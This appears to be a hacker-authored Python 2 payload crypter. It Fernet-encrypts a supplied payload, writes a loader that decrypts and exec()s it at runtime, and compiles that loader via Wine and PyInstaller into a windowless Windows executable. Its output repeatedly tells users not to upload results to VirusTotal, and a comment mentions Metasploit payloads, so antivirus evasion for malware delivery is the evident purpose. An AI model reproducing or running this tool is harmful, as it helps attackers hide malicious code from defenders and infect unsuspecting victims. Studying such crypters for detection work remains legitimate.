#!/usr/local/bin/python
# coding: latin-1
#@Author :#Captain_Nemo

from cryptography.fernet import Fernet
import os
import sys
import random
import time
import subprocess
import platform
import os.path
from os import path

os.system('clear')

class bcolors:
  BLUE = '\033[94m'
  GREEN = '\033[92m'
  WARNING = '\033[93m'
  WHITE = '\033[97m'
  ERROR = '\033[91m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'
  UNDERLINE = '\033[4m'

#if sys.argv[0]:
  # print bcolors.BOLD + bcolors.WHITE + "[+] You need to specify an input payload file to obfuscate"
  # print bcolors.BOLD + bcolors.WHITE + "[+] Syntax : python fernet_obs.py payload.txt "
 #  sys.exit(0)
#else:
with open(sys.argv[1], 'r+') as f:
   contents = f.read()
   banner = '''
                                      █████████████████████████████
                                      █████████████████████████████
                                      ████ ▄▄▄▄▄ █ ▄ █ █ ▄▄▄▄▄ ████
                                      ████ █   █ █ ▀▀ ██ █   █ ████
                                      ████ █▄▄▄█ █▀▀█▀ █ █▄▄▄█ ████
                                      ████▄▄▄▄▄▄▄█▄▀ █▄█▄▄▄▄▄▄▄████
                                      ████▄ █▀▄ ▄██▄██▄██▄▀▄▄▄ ████
                                      ████▀▀▄▄▀ ▄▀▀   █▀█ █▀▀▀▀████
                                      ████████▄▄▄▄▀█▀█  ▄  ▀█ █████
                                      ████ ▄▄▄▄▄ █▀▄▄  █▀█▀ ▀█▄████
                                      ████ █   █ █▄█▀ ▄▀▄█▀▀▀ ▀████
                                      ████ █▄▄▄█ █▀▄█ ▄█ █▄▄▀█▀████
                                      ████▄▄▄▄▄▄▄█▄▄▄███▄██▄█▄▄████
                                      █████████████████████████████
                                      █████████████████████████████
    '''
print banner.decode('utf-8')

print bcolors.BOLD + bcolors.WHITE + "                                              [+] Author :#Captain_Nemo"
print bcolors.BOLD + bcolors.WHITE + "                                              [+] HACK-ATHON BOOK OF WISDOM "
print bcolors.BOLD + bcolors.WHITE + "                                              [+] YOUTUBE CHANNEL : https://www.youtube.com/channel/UCA1eZ38TvjtyhpLtcZ9UHEQ"
print bcolors.BOLD + bcolors.WHITE + "                                              [+] FACEBOOK : https://www.facebook.com/Hack-Athon-BOOK-of-Wisdom-1258144607678680"
print bcolors.BOLD + bcolors.WHITE + "                                              [+] TWITTER : https://twitter.com/AthonOf"
print bcolors.BOLD + bcolors.WHITE + "                                              [+] GITHUB : https://github.com/1captainnemo1"
 
time.sleep(3)

print bcolors.BLUE + "[+] Raw payload"
print " ============================================================================================="
print contents
print " ============================================================================================="

print bcolors.ERROR + bcolors.BOLD + "[+] Generating Fernet MultiKey"
key = Fernet.generate_key()
print bcolors.BOLD + bcolors.WHITE + "[+] Key = " + key
print bcolors.WHITE + "[+] Please make note of the Key for decryption"

print  bcolors.BOLD + "[+] Generating Fernet Object....please wait"
f = Fernet(key)
print  bcolors.BOLD + bcolors.WHITE + "[+] Fernet Object Generated at :"  
print  f
print bcolors.ERROR + bcolors.BOLD + "[+] Encrypting Payload"
time.sleep(2)
print bcolors.BOLD + bcolors.WHITE +  "================================================================================="
enc_payload = f.encrypt(contents)
print bcolors.BOLD + bcolors.WHITE + "[+] Encrypted Payload : " + enc_payload
print bcolors.BOLD + bcolors.WHITE +  "================================================================================="

print bcolors.ERROR + bcolors.BOLD + "[+] Writing RAW payload to file, Please wait"
#filename1 = "payload" 
Filename = "RawPayload%i"%random.randint(1,10000000001)+".txt"
#print Filename # bookmark 

f1 = open("RawPayload%i"%random.randint(1,10000000001)+".txt", "a")
f1.write(enc_payload)
f1.close()

print  bcolors.BOLD + bcolors.WHITE + "[+] Raw Encrypted Payload written to :" + f1.name

print bcolors.BLUE + bcolors.BOLD + "[+] Do You want to continue  generating the Executable payload (Y/N)"
decision = str(raw_input("enter Y or N\n"))
if decision == 'N':
   print bcolors.BOLD + bcolors.WHITE + "[+]  Have a nice day !!"
   print bcolors.BOLD + bcolors.WHITE + "[+]  DO NOT UPLOAD TO VIRUSTOTAL !!!"
   sys.exit(0)
elif decision == 'Y':
    
    # Create final Obfuscated Executable Python  payload 
    print bcolors.BOLD + bcolors.WHITE + "[+] Generating Final Obfuscated python Payload, Please wait"
    time.sleep(2)
    final_payload = open("FinalPayload%i"%random.randint(1,10000000001)+".py", "w")
    #final_payload = open("FinalPayload.py", "w")
    final_payload.write("""
from cryptography.fernet import Fernet
import os
import sys
key = """ + "\'"+key+"\'")
    #final_payload = open("FinalPayload%i"%random.randint(1,10000000001)+".py", "a")
final_payload.write("""
f_obj= Fernet(key)
enc_pay =""" "\'"+enc_payload+"\'")
    #final_payload = open("FinalPayload%i"%random.randint(1,10000000001)+".py", "a")
final_payload.write("""
exec(f_obj.decrypt(enc_pay))
    """)
final_payload.close()
print  bcolors.BOLD + bcolors.WHITE + "[+] Final Encrypted Payload written to %s : " + final_payload.name #"FinalPayload%i"%random.randint(1,10000000001)+".py"

time.sleep(3)

print  bcolors.BOLD + bcolors.BLUE + "[+] Do you want to compile an executable (.exe) payload  (Y/N) :"
decision1 = str(raw_input("Enter Y or N\n"))
if decision1 == 'N':
   print bcolors.BOLD + bcolors.WHITE + "                [+]  Have a nice day !!"
   print bcolors.BOLD + bcolors.WHITE + "                [+]  DO NOT UPLOAD TO VIRUSTOTAL !!!"
   sys.exit(0)
elif decision1 == 'Y':
    
    # Create  EXE 
    print bcolors.BOLD + bcolors.WHITE + "                [+] Checking Dependencies "
    dep_apt = path.exists('/usr/bin/apt')
    dep_arch = platform.architecture()[0]
    dep_wine = path.exists('/usr/bin/wine')
    dep_wine64 = path.exists('/usr/bin/wine64')
    dep_win_python = path.exists('/root/.wine/drive_c/Python27/python.exe')
    dep_win_pyinstaller = path.exists('/root/.wine/drive_c/Python27/Scripts/pyinstaller.exe')
    dep_win_crypt = path.exists('/root/.wine/drive_c/Python27/Lib/site-packages/cryptography')
    dep_win_Fernet = path.exists('/root/.wine/drive_c/Python27/Lib/site-packages/cryptography/fernet.pyc')
    print bcolors.BOLD + bcolors.WHITE + "                [+] OS Architecture : " + dep_arch
    if dep_wine == True and dep_arch == '32bit':
      print bcolors.BOLD + bcolors.WHITE + "              [+] Wine Installed "
    else:
        print bcolors.BOLD + bcolors.WHITE + "            [+] Installing Wine for x86 Arch"
        os.system('apt-get install wine -y')
    if dep_wine64  == True and dep_arch == '64bit':
      print bcolors.BOLD + bcolors.WHITE + "              [+] Wine64 Installed "
    else:
        print bcolors.BOLD + bcolors.WHITE + "            [+] Installing Wine64 for x64 Arch"
        os.system('apt-get install wine64 -y')
    if dep_win_python == True:
      print bcolors.BOLD + bcolors.WHITE + "              [+] Python for Windows Subsystem Installed"
    else:
        print bcolors.BOLD + bcolors.WHITE + "            [+] Installing Python for Windows Subsystem"
        os.system('wine msiexec /i python-2.7.16.msi')
    if dep_win_pyinstaller == True: 
      print bcolors.BOLD + bcolors.WHITE + "              [+] Pyinstaller For Windows Installed"
    else:
        print bcolors.BOLD + bcolors.WHITE + "            [+] Installing Pyinstaller For Windows"
        os.system('wine /root/.wine/drive_c/Python27/python.exe -m pip install pyinstaller')
    if dep_win_crypt == True:
      print bcolors.BOLD + bcolors.WHITE + "              [+] Windows Python Cryptography Library Present"
    else:
        print bcolors.BOLD + bcolors.WHITE + "            [+] Installing Cryptography"
        os.system('wine /root/.wine/drive_c/Python27/python.exe -m pip install cryptography')
    if dep_win_Fernet == True:
      print bcolors.BOLD + bcolors.WHITE + "              [+] Windows Python Fernet Library Present"
    else:
        print bcolors.BOLD + bcolors.WHITE + "            [+] Installing Fernet"
        os.system('wine /root/.wine/drive_c/Python27/python.exe -m pip install Fernet')
        print bcolors.BOLD + bcolors.WHITE + "            [+] Dependency Check Complete , Initiating Compilation, Please Wait"


print bcolors.BOLD + bcolors.BLUE + "             [+] Enter The Filename of The Final generated Payload (Ex:FinalPayload54321.py :"

file_name = str(raw_input("enter Filename :"))
#print file_name.name
fileobj = open(file_name,"r")
print fileobj.name

with open("out1.py","w") as p1:
     for line in fileobj:
         p1.write(line)
#p1.close()
os.system('wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe -F --noconsole --hidden-import "cryptography.*" --hidden-import Fernet --hidden-import os --hidden-import sys --hidden-import time --hidden-import cryptography --hidden-import code --hidden-import shutil --runtime-hook script.py out1.py')

print bcolors.BOLD + bcolors.WHITE + "[+] Compilation Success-----------"

print bcolors.BOLD + bcolors.WHITE + "[+] Performing Cleanup Job, Please wait"

os.system('rm out1.spec')
time.sleep(1) 

print bcolors.BOLD + bcolors.WHITE + "[+] Executable Located in the /dist Subfolder"
#print bcolors.BOLD + bcolors.WHITE + "[+] Was the raw Payload provided, a MSF payload ? (Y/N)"


print bcolors.BLUE + bcolors.BOLD + "[+] HACK THE MULTIVERSE "

decr = 5
while True:
         print bcolors.ERROR + bcolors.BOLD + "[+] DO  NOT UPLOAD TO VIRUSTOTAL"
         decr = decr-1
         if(decr <=0):
           break
           sys.exit(0)
else: 
     sys.exit(0)
     print bcolors.ERROR + bcolors.BOLD + "[+] Respond in Y or N ONLY" 
     sys.exit(0)
